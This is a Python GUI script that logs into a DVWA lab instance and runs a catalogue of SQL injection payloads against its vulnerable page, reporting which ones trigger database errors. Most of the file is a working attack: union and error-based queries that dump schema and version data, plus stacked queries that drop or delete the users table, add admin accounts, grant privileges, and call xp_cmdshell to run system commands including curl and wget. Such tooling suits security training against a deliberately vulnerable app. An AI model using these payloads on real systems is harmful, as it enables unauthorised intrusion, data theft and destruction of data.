import os
import requests
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import scrolledtext, messagebox
from threading import Thread

# URL of the DVWA application
base_url = "http://192.168.64.3/DVWA/"
login_url = base_url + "login.php"
sqli_url = base_url + "vulnerabilities/sqli/?id={payload}&Submit=Submit"
security_url = base_url + "security.php"

# DVWA login credentials
dvwa_username = "admin"
dvwa_password = "password"

# List of payloads covering various SQL injection scenarios
payloads = {
    "Boolean-Based Blind": [
        "' OR 1=1--",
        "' OR '1'='1'--",
        "' OR 'a'='a'--",
        "' OR 1=1#",
        "' OR '1'='1'#",
        "' OR 'a'='a'#",
        "' OR 1=1/*",
        "' OR '1'='1'/*",
        "' OR 'a'='a'/*",
        "' OR 1=1;--"
    ],
    "Time-Based Blind": [
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' OR IF(1=1, BENCHMARK(10000000,MD5(1)),0)--",
        "' AND IF(1=1, SLEEP(5), 0)--",
        "' AND IF(1=1, BENCHMARK(10000000,MD5(1)),0)--",
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' AND IF(1=1, WAITFOR DELAY '00:00:05', 0)--",
        "' OR IF(1=1, WAITFOR DELAY '00:00:05', 0)--",
        "' WAITFOR DELAY '00:00:05'--",
        "'; WAITFOR DELAY '00:00:05'--"
    ],
    "Union-Based": [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1, 'database', 'version'--",
        "' UNION SELECT 1, @@version, NULL--",
        "' UNION SELECT 1, database(), user()--",
        "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--",
        "' UNION SELECT 1, table_name FROM information_schema.tables--",
        "' UNION SELECT user(), database(), version()--",
        "' UNION SELECT 1, @@hostname, @@datadir--",
        "' UNION SELECT 1, 2, 3 FROM dual--"
    ],
    "Error-Based": [
        "' OR 1=CONVERT(int, 'abc')--",
        "' AND 1=CONVERT(int, 'abc')--",
        "' OR 1=CONVERT(int, 'xyz')--",
        "' AND 1=CONVERT(int, 'xyz')--",
        "' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
        "' OR 1=CONVERT(int, (SELECT column_name FROM information_schema.columns))--",
        "' AND 1=CONVERT(int, (SELECT user()))--",
        "' OR 1=CONVERT(int, (SELECT version()))--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR 1=CONVERT(int, (SELECT @@datadir))--"
    ],
    "Stacked Queries": [
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_who--",
        "'; EXEC xp_cmdshell('ipconfig')--",
        "'; INSERT INTO users (username, password) VALUES ('admin', 'admin')--",
        "'; DELETE FROM users WHERE username='admin'--",
        "'; UPDATE users SET password='password' WHERE username='admin'--",
        "'; SELECT * FROM users--",
        "'; GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost'--",
        "'; REVOKE ALL PRIVILEGES ON *.* FROM 'user'@'localhost'--"
    ],
    "Out-of-Band": [
        "'; WAITFOR DELAY '00:00:10'--",
        "'; WAITFOR DELAY '00:00:20'--",
        "'; WAITFOR DELAY '00:00:30'--",
        "'; WAITFOR DELAY '00:01:00'--",
        "'; WAITFOR DELAY '00:02:00'--",
        "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
        "'; EXEC master..xp_cmdshell 'nslookup example.com'--",
        "'; EXEC master..xp_cmdshell 'tracert example.com'--",
        "'; EXEC master..xp_cmdshell 'curl http://example.com'--",
        "'; EXEC master..xp_cmdshell 'wget http://example.com'--"
    ],
    "Second-Order": [
        "'; INSERT INTO users (username, password) VALUES ('admin', 'admin')--",
        "'; INSERT INTO users (username, password) VALUES ('guest', 'guest')--",
        "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
        "'; INSERT INTO users (username, password) VALUES ('user', 'user')--",
        "'; INSERT INTO users (username, password) VALUES ('root', 'root')--",
        "'; INSERT INTO users (username, password) VALUES ('test1', 'test1')--",
        "'; INSERT INTO users (username, password) VALUES ('admin1', 'admin1')--",
        "'; INSERT INTO users (username, password) VALUES ('guest1', 'guest1')--",
        "'; INSERT INTO users (username, password) VALUES ('root1', 'root1')--",
        "'; INSERT INTO users (username, password) VALUES ('test2', 'test2')--"
    ],
    "Conditional Errors": [
        "' AND 1=CONVERT(int, 'abc')--",
        "' OR 1=CONVERT(int, 'abc')--",
        "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
        "' OR 1=CONVERT(int, (SELECT column_name FROM information_schema.columns))--",
        "' AND 1=CONVERT(int, (SELECT user()))--",
        "' OR 1=CONVERT(int, (SELECT version()))--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR 1=CONVERT(int, (SELECT @@datadir))--",
        "' AND 1=CONVERT(int, (SELECT 1/0))--",
        "' OR 1=CONVERT(int, (SELECT 1/0))--"
    ]
}

# Function to login to DVWA and retrieve session cookies
def get_session_cookies():
    with requests.Session() as session:
        # Get initial login page to retrieve the user_token
        response = session.get(login_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})['value']

        # Login payload
        payload = {
            'username': dvwa_username,
            'password': dvwa_password,
            'Login': 'Login',
            'user_token': user_token
        }

        # Perform login
        post_response = session.post(login_url, data=payload)

        # Check if login was successful
        if "Welcome to Damn Vulnerable Web Application" in post_response.text:
            print("Login successful.")
            cookies = session.cookies.get_dict()
            
            # Return updated cookies
            cookies = session.cookies.get_dict()
            return cookies
        else:
            print("Login failed. Check your credentials and DVWA configuration.")
            return None

# Function to set security level
def set_security_level(session, level):
    response = session.get(security_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Find the security form and user token
    security_form = soup.find('form')
    user_token = security_form.find('input', {'name': 'user_token'})['value']
    
    # Set security level
    security_payload = {
        'security': level,
        'seclev_submit': 'Submit',
        'user_token': user_token
    }
    session.post(security_url, data=security_payload)
    print(f"Security level set to {level}.")
    
    # Return updated cookies after setting security level
    cookies = session.cookies.get_dict()
    return cookies

# Function to manually test SQL injection vulnerabilities
def test_sql_injection(session, cookies, payloads):
    results = []
    for scenario, tests in payloads.items():
        for payload in tests:
            url = sqli_url.format(payload=payload)
            response = session.get(url, cookies=cookies)
            if "you have an error in your sql syntax" in response.text.lower() or \
               "warning" in response.text.lower() or \
               "mysql_fetch" in response.text.lower() or \
               "mysql_num_rows" in response.text.lower():
                results.append(f"{scenario} - Vulnerable payload: {payload}")
    return results

# Function to run the tests and update the output in the UI
def launch_attack():
    text_area.delete('1.0', tk.END)
    text_area.insert(tk.END, "Performing tests, please wait...\n")
    text_area.update()
    
    cookies = get_session_cookies()
    
    if cookies:
        # Set security level
        with requests.Session() as session:
            session.cookies.update(cookies)
            updated_cookies = set_security_level(session, security_level.get())
        
        # Perform manual SQL injection testing
        print("Testing for SQL Injection vulnerabilities...")
        results = test_sql_injection(session, updated_cookies, payloads)
        
        # Update the UI with the results
        text_area.delete('1.0', tk.END)
        if results:
            text_area.insert(tk.END, "\n".join(results))
        else:
            text_area.insert(tk.END, "No vulnerabilities found.")
    else:
        text_area.delete('1.0', tk.END)
        text_area.insert(tk.END, "Login failed. Check your credentials and DVWA configuration.")

def run_attack_thread():
    attack_thread = Thread(target=launch_attack)
    attack_thread.start()

# Create the main window
root = tk.Tk()
root.title("SQL Injection Manual Test Launcher")

# Create a label and radio buttons for selecting security level
tk.Label(root, text="Select DVWA Security Level:").pack(pady=5)
security_level = tk.StringVar(value="low")
security_levels = [("Low", "low"), ("Medium", "medium"), ("High", "high"), ("Impossible", "impossible")]
for text, mode in security_levels:
    tk.Radiobutton(root, text=text, variable=security_level, value=mode).pack(anchor=tk.W)

# Create a button to launch the attack
launch_button = tk.Button(root, text="Launch Attack", command=run_attack_thread)
launch_button.pack(pady=10)

# Create a scrolled text area to display the output
text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=100, height=30)
text_area.pack(pady=10)

# Function to handle window close event
def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)

# Run the main loop
root.mainloop()
